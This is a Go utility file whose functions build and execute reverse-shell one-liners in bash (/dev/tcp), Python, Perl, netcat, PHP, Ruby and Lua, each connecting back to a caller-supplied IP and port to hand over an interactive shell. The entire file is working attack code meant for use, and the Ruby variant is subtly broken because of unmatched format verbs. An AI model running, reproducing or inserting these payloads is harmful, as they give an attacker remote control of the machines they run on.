package utils

import (
	"fmt"
	"os/exec"
	"strings"
)

func executeCommand(command []string) {
	out, err := exec.Command(command[0], command[1:]...).Output()
	if err != nil {
		fmt.Printf("%s", err)
	}
	output := string(out[:])
	fmt.Println(output)
}

func Bash(ip string, port string) {
	command := fmt.Sprintf("bash -c /bin/bash -i >& /dev/tcp/%s/%s 0>&1", ip, port)
	split_command := strings.SplitN(command, " ", 3)
	executeCommand(split_command)
}

func Python(ip string, port string) {
	command := fmt.Sprintf("python -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"%s\",%s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);", ip, port)
	split_command := strings.SplitN(command, " ", 3)
	executeCommand(split_command)
}

func Python3(ip string, port string) {
	command := fmt.Sprintf("python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"%s\",%s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);", ip, port)
	split_command := strings.SplitN(command, " ", 3)
	executeCommand(split_command)
}

func Perl(ip string, port string) {
	command := fmt.Sprintf("perl -e use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};", ip, port)
	split_command := strings.SplitN(command, " ", 3)
	executeCommand(split_command)
}

func Netcat(ip string, port string) {
	command := fmt.Sprintf("bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", ip, port)
	split_command := strings.SplitN(command, " ", 3)
	executeCommand(split_command)
}

func Php(ip string, port string) {
	command := fmt.Sprintf("php -r $sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");", ip, port)
	split_command := strings.SplitN(command, " ", 3)
	executeCommand(split_command)
}

func Ruby(ip string, port string) {
	command := fmt.Sprintf("ruby -rsocket -e f=TCPSocket.open(\"%s\",%s).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)", ip, port)
	split_command := strings.SplitN(command, " ", 4)
	executeCommand(split_command)
}

func Lua(ip string, port string) {
	command := fmt.Sprintf("lua -e require('socket');require('os');t=socket.tcp();t:connect('%s','%s');os.execute('/bin/sh -i <&3 >&3 2>&3');", ip, port)
	split_command := strings.SplitN(command, " ", 3)
	executeCommand(split_command)
}
